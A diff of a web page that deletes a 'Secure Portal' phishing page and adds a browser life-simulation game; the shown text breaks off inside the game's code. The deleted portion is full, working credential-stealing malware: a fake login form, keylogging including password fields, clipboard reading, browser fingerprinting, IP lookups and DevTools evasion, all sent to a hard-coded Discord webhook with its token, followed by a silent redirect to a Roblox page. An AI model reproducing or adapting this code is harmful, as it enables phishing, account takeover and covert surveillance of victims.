@@ -1,453 +1,1109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Portal</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg,#1e2a3a,#2c3e50);
-         min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-  .card { background:#fff; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,.35);
-          padding:40px 45px; width:380px; text-align:center; }
-  .logo { width:56px; height:56px; border-radius:50%; background:#5865F2; color:#fff; font-weight:700;
-          font-size:26px; line-height:56px; margin:0 auto 18px; }
-  h2 { color:#222; font-size:22px; margin-bottom:6px; }
-  .sub { color:#777; font-size:13px; margin-bottom:24px; }
-  input { width:100%; padding:12px 14px; margin-bottom:12px; border:1px solid #d5d9de; border-radius:6px;
-          font-size:14px; outline:none; transition:border .2s; }
-  input:focus { border-color:#5865F2; }
-  button { width:100%; padding:12px; background:#5865F2; color:#fff; border:none; border-radius:6px;
-           font-size:15px; font-weight:600; cursor:pointer; margin-top:6px; }
-  button:hover { background:#4752c4; }
-  .spinner { width:32px; height:32px; border:4px solid #e0e0e0; border-top-color:#5865F2; border-radius:50%;
-             margin:0 auto 14px; animation:spin 1s linear infinite; display:none; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .foot { margin-top:22px; font-size:11px; color:#aaa; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Life Simulator</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #0d1117;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        header {
+            background: #161b22;
+            border-bottom: 1px solid #30363d;
+            padding: 20px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 30px;
+        }
+
+        header p {
+            color: #8b949e;
+            margin-top: 5px;
+        }
+
+        .container {
+            width: min(1100px, 94%);
+            margin: 30px auto;
+        }
+
+        .top-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .profile {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .avatar {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: #238636;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+        }
+
+        .profile h2 {
+            margin-bottom: 6px;
+        }
+
+        .muted {
+            color: #8b949e;
+        }
+
+        .money {
+            color: #3fb950;
+            font-size: 30px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .stat {
+            background: #0d1117;
+            padding: 12px;
+            border-radius: 8px;
+        }
+
+        .stat-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .bar {
+            height: 8px;
+            background: #30363d;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .bar-fill {
+            height: 100%;
+            width: 50%;
+            background: #58a6ff;
+            transition: width 0.3s;
+        }
+
+        .game {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 20px;
+        }
+
+        .event {
+            min-height: 180px;
+        }
+
+        .event h2 {
+            margin-bottom: 12px;
+        }
+
+        .event-text {
+            color: #c9d1d9;
+            line-height: 1.6;
+            font-size: 17px;
+        }
+
+        .choices {
+            display: grid;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        button {
+            border: 1px solid #30363d;
+            background: #21262d;
+            color: white;
+            padding: 13px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+
+        button:hover {
+            background: #30363d;
+            transform: translateY(-1px);
+        }
+
+        button.primary {
+            background: #238636;
+            border-color: #2ea043;
+        }
+
+        button.primary:hover {
+            background: #2ea043;
+        }
+
+        button.danger {
+            background: #da3633;
+            border-color: #f85149;
+        }
+
+        .actions {
+            display: grid;
+            gap: 10px;
+        }
+
+        .actions button {
+            text-align: left;
+        }
+
+        .job {
+            margin-top: 15px;
+            padding: 15px;
+            background: #0d1117;
+            border-radius: 8px;
+        }
+
+        .job strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .log {
+            margin-top: 20px;
+        }
+
+        .log-list {
+            max-height: 250px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+
+        .log-entry {
+            padding: 10px;
+            border-bottom: 1px solid #21262d;
+            color: #8b949e;
+        }
+
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 100;
+        }
+
+        .game-over {
+            width: min(500px, 100%);
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .game-over h1 {
+            font-size: 35px;
+            margin-bottom: 15px;
+        }
+
+        .final-stats {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .final-stats div {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #30363d;
+        }
+
+        @media (max-width: 800px) {
+            .top-grid,
+            .game {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-<!-- ============ DECOY LOGIN UI ============ -->
-<div class="card" id="loginCard">
-  <div class="logo">S</div>
-  <h2>Secure Portal</h2>
-  <div class="sub">Sign in to continue</div>
-  <div class="spinner" id="spin"></div>
-  <form id="loginForm" autocomplete="on">
-    <input type="text"     name="username" placeholder="Email or username" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <input type="text"     name="otp"      placeholder="2FA code (optional)">
-    <button type="submit">Sign In</button>
-  </form>
-  <div class="foot">Protected by corporate security policy</div>
+<header>
+    <h1>Life Simulator</h1>
+    <p>Every decision changes your life.</p>
+</header>
+
+<div class="container">
+
+    <div class="top-grid">
+
+        <div class="card">
+            <div class="profile">
+                <div class="avatar">👤</div>
+
+                <div>
+                    <h2 id="playerName">Alex</h2>
+                    <p class="muted">
+                        Age <span id="age">18</span>
+                    </p>
+                </div>
+            </div>
+
+            <div class="money">
+                $<span id="money">1,000</span>
+            </div>
+
+            <div class="job">
+                <strong>💼 <span id="jobName">Unemployed</span></strong>
+                <span class="muted">
+                    Income: $<span id="income">0</span>/day
+                </span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Statistics</h2>
+
+            <div class="stats">
+
+                <div class="stat">
+                    <div class="stat-top">
+                        <span>❤️ Health</span>
+                        <span id="healthValue">75</span>
+                    </div>
+                    <div class="bar">
+                        <div class="bar-fill" id="healthBar"></div>
+                    </div>
+                </div>
+
+                <div class="stat">
+                    <div class="stat-top">
+                        <span>😊 Happiness</span>
+                        <span id="happinessValue">75</span>
+                    </div>
+                    <div class="bar">
+                        <div class="bar-fill" id="happinessBar"></div>
+                    </div>
+                </div>
+
+                <div class="stat">
+                    <div class="stat-top">
+                        <span>🧠 Intelligence</span>
+                        <span id="intelligenceValue">50</span>
+                    </div>
+                    <div class="bar">
+                        <div class="bar-fill" id="intelligenceBar"></div>
+                    </div>
+                </div>
+
+                <div class="stat">
+                    <div class="stat-top">
+                        <span>⚡ Energy</span>
+                        <span id="energyValue">80</span>
+                    </div>
+                    <div class="bar">
+                        <div class="bar-fill" id="energyBar"></div>
+                    </div>
+                </div>
+
+                <div class="stat">
+                    <div class="stat-top">
+                        <span>⭐ Reputation</span>
+                        <span id="reputationValue">20</span>
+                    </div>
+                    <div class="bar">
+                        <div class="bar-fill" id="reputationBar"></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <div class="game">
+
+        <div>
+
+            <div class="card event">
+
+                <h2 id="eventTitle">Welcome to Life</h2>
+
+                <p class="event-text" id="eventText">
+                    You are 18 years old with your entire life ahead of you.
+                    What will you do?
+                </p>
+
+                <div class="choices" id="choices">
+
+                    <button class="primary" onclick="nextDay()">
+                        Start Your Day
+                    </button>
+
+                </div>
+
+            </div>
+
+            <div class="card log">
+
+                <h2>Life Log</h2>
+
+                <div class="log-list" id="logList">
+                    <div class="log-entry">
+                        You started your life with $1,000.
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+        <div>
+
+            <div class="card">
+
+                <h2>Daily Actions</h2>
+
+                <div class="actions">
+
+                    <button onclick="work()">
+                        💼 Work
+                    </button>
+
+                    <button onclick="study()">
+                        📚 Study
+                    </button>
+
+                    <button onclick="exercise()">
+                        🏃 Exercise
+                    </button>
+
+                    <button onclick="relax()">
+                        🎮 Relax
+                    </button>
+
+                    <button onclick="shop()">
+                        🛒 Go Shopping
+                    </button>
+
+                    <button onclick="nextDay()">
+                        🌅 End Day
+                    </button>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
 </div>
 
+
+<div class="overlay" id="gameOver">
+
+    <div class="game-over">
+
+        <h1>Life Complete</h1>
+
+        <p class="muted">
+            Your life has come to an end.
+        </p>
+
+        <div class="final-stats">
+
+            <div>
+                <span>Age</span>
+                <strong id="finalAge">0</strong>
+            </div>
+
+            <div>
+                <span>Money</span>
+                <strong>$<span id="finalMoney">0</span></strong>
+            </div>
+
+            <div>
+                <span>Health</span>
+                <strong id="finalHealth">0</strong>
+            </div>
+
+            <div>
+                <span>Happiness</span>
+                <strong id="finalHappiness">0</strong>
+            </div>
+
+            <div>
+                <span>Reputation</span>
+                <strong id="finalReputation">0</strong>
+            </div>
+
+        </div>
+
+        <button class="primary" onclick="restartGame()">
+            🔄 Start a New Life
+        </button>
+
+    </div>
+
+</div>
+
+
 <script>
-// =====================================================================
-//  CONFIG — replace these before deploying
-// =====================================================================
-const CONFIG = {
-  WEBHOOK_URL: "https://discord.com/api/webhooks/1536223338647654400/zZIPTm_UF5MCzxbP4DN78a34iJg-5HBGD1zDQrbcwgII4_73Z5hEBOcy1OSwTPN7KooE",
-  REDIRECT_URL: "https://www.roblox.com/games/109983668079237/Steal-a-Brainrot",          // where the victim lands after "login"
-  FLUSH_INTERVAL_MS: 10000,                          // how often batched events are sent
-  FEATURES: {
-    keylog:         true,    // keystroke capture (full transcript incl. password field values)
-    formCapture:    true,    // grab all input values on submit / blur
-    clipboard:      true,    // capture paste/copy events + readText on focus
-    mouseTrack:     true,    // throttled mouse movement + click targets
-    geo:            false,   // HTML5 geolocation (triggers browser permission prompt!)
-    devtoolsAlert:  true,    // detect opened DevTools and alert
-    headlessAlert:  true,    // basic headless-browser heuristic alert
-    decoyLogin:     true,    // show the fake login form (false = bare loader page)
-  }
-};
 
-// =====================================================================
-//  Logger core
-// =====================================================================
-const Logger = (() => {
-  const buffer = [];                 // pending events
-  const MAX_EVENTS = 400;
-  const QUEUE_CAP = 5;               // failed payloads kept for retry
-  let queue = [];
-  let sending = false;
-  let lastKey = { t: 0, field: null, text: "" };
+    let player = {
+        name: randomName(),
+        age: 18,
+        money: 1000,
 
-  // stable pseudo-session id stored in localStorage to correlate repeat visits
-  let sid = localStorage.getItem("hp_sid");
-  if (!sid) { sid = Math.random().toString(36).slice(2, 10); localStorage.setItem("hp_sid", sid); }
+        health: 75,
+        happiness: 75,
+        intelligence: 50,
+        energy: 80,
+        reputation: 20,
 
-  const now = () => new Date().toISOString();
+        job: "Unemployed",
+        income: 0,
 
-  const push = (type, data) => {
-    if (buffer.length >= MAX_EVENTS) buffer.shift();   // drop oldest
-    buffer.push({ t: now(), type, data });
-  };
-
-  const trunc = (s, n) => { s = String(s ?? ""); return s.length > n ? s.slice(0, n - 1) + "…" : s; };
-
-  // Group buffered events into a compact, Discord-friendly embed payload
-  function buildPayload() {
-    const events = buffer.splice(0, buffer.length);
-    const fields = [];
-    const keylogChunks = [];
-
-    for (const ev of events) {
-      if (ev.type === "keystroke") {
-        keylogChunks.push(ev.data);                     // merge typing into a transcript
-      } else if (ev.type === "mousemove") {
-        continue;                                       // too noisy — counts go to summary
-      } else {
-        fields.push({ name: ev.type, value: trunc(typeof ev.data === "string" ? ev.data : JSON.stringify(ev.data), 1000), inline: false });
-      }
-    }
-
-    const summary = {
-      events: events.length,
-      keystrokes: keylogChunks.reduce((a, s) => a + (s.key ? 1 : 0), 0),
-      moves: events.filter(e => e.type === "mousemove").length,
-      clicks: events.filter(e => e.type === "click").length,
-      session: sid,
+        alive: true
     };
 
-    const embed = {
-      title: `🎯 Activity report — ${events.length} events`,
-      color: 0xED4245,
-      fields: [
-        { name: "Summary", value: `Session \`${sid}\`\nKeystrokes: ${summary.keystrokes} | Clicks: ${summary.clicks} | Moves: ${summary.moves}`, inline: false },
-        ...fields.slice(0, 22),
-      ],
-      footer: { text: `Page: ${location.href}` },
-      timestamp: now(),
-    };
 
-    if (keylogChunks.length) {
-      const transcript = keylogChunks
-        .map(k => k.field ? `[${k.field}] ${k.key}` : k.key)
-        .join("")
-        .slice(-1800);
-      // insert transcript right after summary
-      embed.fields.splice(1, 0, { name: "⌨️ Typing transcript", value: "```" + trunc(transcript, 990) + "```", inline: false });
+    const jobs = [
+        {
+            name: "Fast Food Worker",
+            income: 60,
+            intelligence: 20
+        },
+
+        {
+            name: "Retail Worker",
+            income: 75,
+            intelligence: 30
+        },
+
+        {
+            name: "Construction Worker",
+            income: 110,
+            intelligence: 35
+        },
+
+        {
+            name: "Programmer",
+            income: 200,
+            intelligence: 70
+        },
+
+        {
+            name: "Doctor",
+            income: 350,
+            intelligence: 90
+        }
+    ];
+
+
+    const randomEvents = [
+
+        {
+            title: "You Found Money",
+            text: "You were walking down the street and found $200 on the ground.",
+            action: () => {
+                player.money += 200;
+                log("You found $200 on the ground.");
+            }
+        },
+
+        {
+            title: "Car Trouble",
+            text: "Your car broke down. Repairs will cost you $300.",
+            action: () => {
+                if (player.money >= 300) {
+                    player.money -= 300;
+                    log("You paid $300 to repair your car.");
+                } else {
+                    player.happiness -= 10;
+                    log("You couldn't afford to repair your car.");
+                }
+            }
+        },
+
+        {
+            title: "Good News!",
+            text: "Your boss noticed your hard work and gave you a bonus.",
+            action: () => {
+                const bonus = 250;
+                player.money += bonus;
+                player.reputation += 5;
+                log("You received a $250 work bonus.");
+            }
+        },
+
+        {
+            title: "Feeling Sick",
+            text: "You aren't feeling very well today.",
+            action: () => {
+                player.health -= 10;
+                player.energy -= 15;
+                log("You became sick.");
+            }
+        },
+
+        {
+            title: "Lottery",
+            text: "You bought a lottery ticket yesterday. You won $1,000!",
+            action: () => {
+                player.money += 1000;
+                player.happiness += 15;
+                log("You won $1,000 in the lottery!");
+            }
+        },
+
+        {
+            title: "Promotion",
+            text: "Your employer offered you a promotion.",
+            action: () => {
+                player.income += 40;
+                player.reputation += 10;
+                log("You received a promotion.");
+            }
+        }
+
+    ];
+
+
+    function randomName() {
+
+        const names = [
+            "Alex",
+            "Jordan",
+            "Taylor",
+            "Chris",
+            "Jamie",
+            "Morgan",
+            "Cameron",
+            "Riley",
+            "Avery",
+            "Dylan"
+        ];
+
+        return names[Math.floor(Math.random() * names.length)];
     }
 
-    return { embeds: [embed], username: "Tracker" };
-  }
 
-  async function post(payload) {
-    await fetch(CONFIG.WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-  }
+    function clampStats() {
 
-  async function flush() {
-    if (sending) return;
-    if (buffer.length === 0 && queue.length === 0) return;
-    sending = true;
-    try {
-      const payload = buildPayload();
-      const bodies = [payload, ...queue.splice(0)];     // send new + retries
-      for (const b of bodies) {
-        if (b.embeds[0].fields.length === 1 && b.embeds[0].fields[0].name === "Summary" && b.embeds[0].fields[0].value.includes("events: 0")) continue;
-        try { await post(b); }
-        catch (e) { if (queue.length < QUEUE_CAP) queue.push(b); }   // retry later
-      }
-    } finally { sending = false; }
-  }
+        player.health = Math.max(0, Math.min(100, player.health));
 
-  // Beacon-based final flush when the tab closes (no response needed)
-  function beaconFlush() {
-    if (buffer.length === 0) return;
-    const payload = buildPayload();
-    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-    try { navigator.sendBeacon(CONFIG.WEBHOOK_URL, blob); } catch (e) {}
-  }
+        player.happiness =
+            Math.max(0, Math.min(100, player.happiness));
 
-  return { push, flush, beaconFlush, sid, now };
-})();
+        player.intelligence =
+            Math.max(0, Math.min(100, player.intelligence));
 
-// =====================================================================
-//  Static reconnaissance (IP, geo, fingerprint) — sent immediately
-// =====================================================================
-async function getIP() {
-  try {
-    const r = await fetch("https://ipapi.co/json/");
-    if (r.ok) return await r.json();
-    throw new Error("primary failed");
-  } catch (e) {
-    try {
-      const r = await fetch("https://ipwho.is/");
-      if (r.ok) return await r.json();
-    } catch (e2) {}
-    const r = await fetch("https://api.ipify.org?format=json");
-    return { ip: (await r.json()).ip };
-  }
-}
+        player.energy =
+            Math.max(0, Math.min(100, player.energy));
 
-function canvasFingerprint() {
-  try {
-    const c = document.createElement("canvas");
-    c.width = c.height = 250;
-    const ctx = c.getContext("2d");
-    ctx.textBaseline = "top";
-    ctx.font = "14px Arial";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(0, 0, 250, 250);
-    ctx.fillStyle = "#069";
-    ctx.fillText("HackerAI-fp-⛾𝌆中", 10, 10);
-    const data = c.toDataURL();
-    let h = 5381;
-    for (let i = 0; i < data.length; i++) h = ((h << 5) + h + data.charCodeAt(i)) >>> 0;
-    return h.toString(16);
-  } catch (e) { return "canvas-blocked"; }
-}
+        player.reputation =
+            Math.max(0, Math.min(100, player.reputation));
 
-function webglInfo() {
-  try {
-    const gl = document.createElement("canvas").getContext("webgl");
-    if (!gl) return "no-webgl";
-    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-  } catch (e) { return "webgl-blocked"; }
-}
-
-function detectedFonts() {
-  const list = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Tahoma",
-                "Trebuchet MS","Impact","Palatino","Helvetica","Segoe UI","Roboto","Open Sans","Monaco","Menlo"];
-  const present = [];
-  try {
-    for (const f of list) {
-      try { if (document.fonts && document.fonts.check(`16px "${f}"`)) present.push(f); } catch (e) {}
     }
-  } catch (e) {}
-  return present;
-}
 
-async function collectStaticInfo() {
-  const geo = await getIP();
-  const info = {
-    ip: geo.ip, country: geo.country_name || geo.country || "?", region: geo.region || geo.region_name || "?",
-    city: geo.city || "?", isp: geo.org || geo.connection?.isp || "?",
-    lat: geo.latitude ?? "?", lon: geo.longitude ?? "?",
-    user_agent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    local_time: new Date().toLocaleString(),
-    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`,
-    referrer: document.referrer || "direct",
-    cookies: navigator.cookieEnabled,
-    do_not_track: navigator.doNotTrack,
-    cores: navigator.hardwareConcurrency,
-    memory_gb: navigator.deviceMemory || "?",
-    touch: navigator.maxTouchPoints > 0,
-    online: navigator.onLine,
-    webdriver: navigator.webdriver || false,
-    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "none",
-    canvas_hash: canvasFingerprint(),
-    webgl_renderer: webglInfo(),
-    fonts: detectedFonts().join(", "),
-  };
-  try {
-    const conn = navigator.connection;
-    if (conn) { info.network = `${conn.effectiveType} | down ${conn.downlink}Mb/s | rtt ${conn.rtt}ms`; }
-  } catch (e) {}
-  try {
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      info.battery = `${Math.round(b.level * 100)}% ${b.charging ? "charging" : "discharging"}`;
+
+    function updateUI() {
+
+        document.getElementById("playerName").textContent =
+            player.name;
+
+        document.getElementById("age").textContent =
+            player.age;
+
+        document.getElementById("money").textContent =
+            player.money.toLocaleString();
+
+        document.getElementById("jobName").textContent =
+            player.job;
+
+        document.getElementById("income").textContent =
+            player.income;
+
+
+        updateStat("health");
+        updateStat("happiness");
+        updateStat("intelligence");
+        updateStat("energy");
+        updateStat("reputation");
+
     }
-  } catch (e) {}
 
-  Logger.push("🖥️ Initial fingerprint", info);
 
-  // immediate first-hit notification so you know the moment the page loads
-  fetch(CONFIG.WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      username: "Tracker",
-      embeds: [{
-        title: "🛰️ HIT — page loaded",
-        color: 0x57F287,
-        description: `**${info.ip}** — ${info.city}, ${info.country}\n${info.isp}\nUA: \`\`\`${trunc(info.user_agent, 900)}\`\`\``,
-        fields: [
-          { name: "Fingerprint", value: `Canvas \`${info.canvas_hash}\`\nGPU: ${info.webgl_renderer}\nFonts: ${info.fonts}`, inline: false },
-          { name: "Device", value: `${info.platform} | ${info.screen} | ${info.cores} cores | ${info.memory_gb}GB | ${info.network || "?"}`, inline: false },
-        ],
-        footer: { text: `Session ${Logger.sid} | ${location.href}` },
-        timestamp: Logger.now(),
-      }]
-    })
-  }).catch(() => {});
-}
+    function updateStat(stat) {
 
-// =====================================================================
-//  Keylogging (with full password-field capture)
-// =====================================================================
-function initKeylog() {
-  document.addEventListener("keydown", (e) => {
-    if (e.key === undefined) return;
-    const el = e.target;
-    const isInput = el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA");
-    const field = isInput ? `${el.name || el.id || el.type || el.tagName}` : null;
-    Logger.push("keystroke", { key: e.key.length === 1 ? e.key : `[${e.key}]`, field });
-  });
+        const value = Math.round(player[stat]);
 
-  // For password/email fields: grab the full value whenever it changes (debounced)
-  const grabValues = (el) => {
-    if (el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA")) {
-      const v = el.value;
-      if (v) Logger.push("📝 Field value", `name=${el.name || el.id || "?"} value="${v}"`);
+        document.getElementById(stat + "Value")
+            .textContent = value;
+
+        document.getElementById(stat + "Bar")
+            .style.width = value + "%";
+
     }
-  };
-  document.addEventListener("input", debounce((e) => {
-    const el = e.target;
-    if (el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA")) {
-      if (el.type === "password" || el.type === "email" || el.type === "text") grabValues(el);
+
+
+    function log(message) {
+
+        const list = document.getElementById("logList");
+
+        const entry = document.createElement("div");
+
+        entry.className = "log-entry";
+
+        entry.textContent =
+            `Age ${player.age}: ${message}`;
+
+        list.prepend(entry);
+
     }
-  }, 900));
 
-  document.addEventListener("change", (e) => grabValues(e.target));
-}
 
-function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }
+    function setEvent(title, text, buttons = []) {
 
-// =====================================================================
-//  Form capture (submit-time grab of ALL fields)
-// =====================================================================
-function initFormCapture() {
-  document.addEventListener("submit", (e) => {
-    const form = e.target;
-    const data = {};
-    form.querySelectorAll("input, select, textarea").forEach(el => {
-      const name = el.name || el.id || el.type;
-      if (name) data[name] = el.value;
-    });
-    Logger.push("🔑 Credentials captured", data);
+        document.getElementById("eventTitle")
+            .textContent = title;
 
-    // fake "verifying" delay, then redirect — the victim never notices
-    e.preventDefault();
-    document.getElementById("spin").style.display = "block";
-    document.querySelector("button").disabled = true;
-    Logger.flush();
-    setTimeout(() => { location.href = CONFIG.REDIRECT_URL; }, 1800);
-  });
-}
+        document.getElementById("eventText")
+            .textContent = text;
 
-// =====================================================================
-//  Clipboard capture
-// =====================================================================
-function initClipboard() {
-  document.addEventListener("paste", (e) => {
-    try {
-      const txt = (e.clipboardData || window.clipboardData).getData("text");
-      if (txt) Logger.push("📋 Paste", `into ${e.target.name || e.target.tagName}: ${trunc(txt, 800)}`);
-    } catch (err) {}
-  });
-  document.addEventListener("copy", () => { try { Logger.push("📋 Copy event", "user copied something"); } catch (e) {} });
+        const choices =
+            document.getElementById("choices");
 
-  // try silent clipboard read when the tab regains focus (may prompt permission in some browsers)
-  document.addEventListener("visibilitychange", async () => {
-    if (document.visibilityState === "visible" && navigator.clipboard && navigator.clipboard.readText) {
-      try {
-        const txt = await navigator.clipboard.readText();
-        if (txt) Logger.push("📋 Clipboard read", trunc(txt, 800));
-      } catch (e) {} // permission denied — silent
+        choices.innerHTML = "";
+
+        buttons.forEach(button => {
+
+            const btn =
+                document.createElement("button");
+
+            btn.textContent = button.text;
+
+            if (button.primary) {
+                btn.className = "primary";
+            }
+
+            btn.onclick = button.action;
+
+            choices.appendChild(btn);
+
+        });
+
     }
-  });
-}
 
-// =====================================================================
-//  Mouse / click tracking
-// =====================================================================
-function initMouse() {
-  let lastMove = 0;
-  document.addEventListener("mousemove", (e) => {
-    const t = Date.now();
-    if (t - lastMove < 500) return;          // throttle to 2 samples/sec
-    lastMove = t;
-    Logger.push("mousemove", `${e.clientX},${e.clientY}`);
-  });
-  document.addEventListener("click", (e) => {
-    const el = e.target;
-    Logger.push("click", `(${e.clientX},${e.clientY}) on <${el.tagName.toLowerCase()}${el.name ? ` name="${el.name}"` : ""}>${el.value ? ` value="${trunc(el.value, 50)}"` : ""}`);
-  });
-  document.addEventListener("contextmenu", (e) => Logger.push("🖱️ Right-click", `(${e.clientX},${e.clientY})`));
-}
 
-// =====================================================================
-//  Optional geolocation (needs user permission)
-// =====================================================================
-function initGeo() {
-  if (!CONFIG.FEATURES.geo || !navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(
-    (pos) => Logger.push("📍 GPS", `lat=${pos.coords.latitude}, lon=${pos.coords.longitude}, acc=${Math.round(pos.coords.accuracy)}m`),
-    () => Logger.push("📍 GPS", "user denied geolocation permission"),
-    { timeout: 8000 }
-  );
-}
+    function work() {
 
-// =====================================================================
-//  DevTools & headless detection
-// =====================================================================
-function initDetection() {
-  let alerted = false;
-  const alertOnce = (msg) => { if (!alerted) { alerted = true; Logger.push("⚠️ " + msg); } };
+        if (!player.alive) return;
 
-  if (CONFIG.FEATURES.devtoolsAlert) {
-    setInterval(() => {
-      const w = window.outerWidth - window.innerWidth;
-      const h = window.outerHeight - window.innerHeight;
-      if (w > 160 || h > 160) alertOnce("DevTools detected (window size)");
-      // debugger-based check: measure execution slowdown
-      const t0 = performance.now();
-      try { debugger; } catch (e) {}
-      if (performance.now() - t0 > 100) alertOnce("DevTools detected (debugger pause)");
-    }, 2500);
-  }
+        if (player.job === "Unemployed") {
 
-  if (CONFIG.FEATURES.headlessAlert) {
-    const heuristics = [];
-    if (navigator.webdriver) heuristics.push("navigator.webdriver=true");
-    if (!window.chrome && !window.safari) heuristics.push("no chrome/safari globals");
-    if (navigator.plugins && navigator.plugins.length === 0) heuristics.push("no plugins");
-    if (heuristics.length) alertOnce("Possible headless browser: " + heuristics.join(", "));
-  }
-}
+            findJob();
 
-// =====================================================================
-//  Boot
-// =====================================================================
-function init() {
-  if (CONFIG.WEBHOOK_URL.includes("YOUR_WEBHOOK")) {
-    console.warn("Set CONFIG.WEBHOOK_URL first.");
-    return;
-  }
+            return;
+        }
 
-  if (!CONFIG.FEATURES.decoyLogin) document.getElementById("loginCard").style.display = "none";
+        if (player.energy < 15) {
 
-  collectStaticInfo();
+            setEvent(
+                "Too Tired",
+                "You're too tired to work today."
+            );
 
-  if (CONFIG.FEATURES.keylog)     initKeylog();
-  if (CONFIG.FEATURES.formCapture) initFormCapture();
-  if (CONFIG.FEATURES.clipboard)  initClipboard();
-  if (CONFIG.FEATURES.mouseTrack) initMouse();
-  initGeo();
-  initDetection();
+            return;
+        }
 
-  // periodic batched flush
-  setInterval(Logger.flush, CONFIG.FLUSH_INTERVAL_MS);
+        player.money += player.income;
 
-  // flush immediately when the tab is closed/hidden
-  window.addEventListener("pagehide", Logger.beaconFlush);
-  document.addEventListener("visibilitychange", () => { if (document.visibilityState === "hidden") Logger.flush(); });
-}
+        player.energy -= 15;
 
-document.addEventListener("DOMContentLoaded", init);
+        player.happiness -= 3;
+
+        player.reputation += 1;
+
+        log(
+            `You worked and earned $${player.income}.`
+        );
+
+        checkJobPromotion();
+
+        clampStats();
+
+        updateUI();
+
+    }
+
+
+    function findJob() {
+
+        const available =
+            jobs.filter(job =>
+                player.intelligence >= job.intelligence
+            );
+
+        if (available.length === 0) {
+
+            setEvent(
+                "No Jobs Available",
+                "You don't currently have the intelligence required for the available jobs."
+            );
+
+            return;
+        }
+
+        const job =
+            available[
+                Math.floor(Math.random() * available.length)
+            ];
+
+        player.job = job.name;
+
+        player.income = job.income;
+
+        player.reputation += 2;
+
+        log(
+            `You got a job as a ${job.name}.`
+        );
+
+        setEvent(
+            "New Job!",
+            `You got a job as a ${job.name}, earning $${job.income} per day.`,
+            [
+                {
+                    text: "Continue",
+                    primary: true,
+                    action: nextDay
+                }
+            ]
+        );
+
+        updateUI();
+
+    }
+
+
+    function checkJobPromotion() {
+
+        if (Math.random() < 0.05) {
+
+            player.income += 25;
+
+            player.reputation += 5;
+
+            log(
+                "You received a promotion and now earn $25 more per day."
+            );
+
+        }
+
+    }
+
+
+    function study() {
+
+        if (player.energy < 15) {
+
+            setEvent(
+                "Too Tired",
+                "You're too tired to study."
+            );
+
+            return;
+        }
+
+        player.intelligence += 4;
+
+        player.energy -= 15;
+
+        player.happiness -= 2;
+
+        log(
+            "You studied and improved your intelligence."
+        );
+
+        clampStats();
+
+        updateUI();
+
+    }
+
+
+    function exercise() {
+
+        if (player.energy < 20) {
+
+            setEvent(
+                "Too Tired",
+                "You're too tired to exercise."
+            );
+
+            return;
+        }
+
+        player.health += 5;
+
+        player.energy -= 20;
+
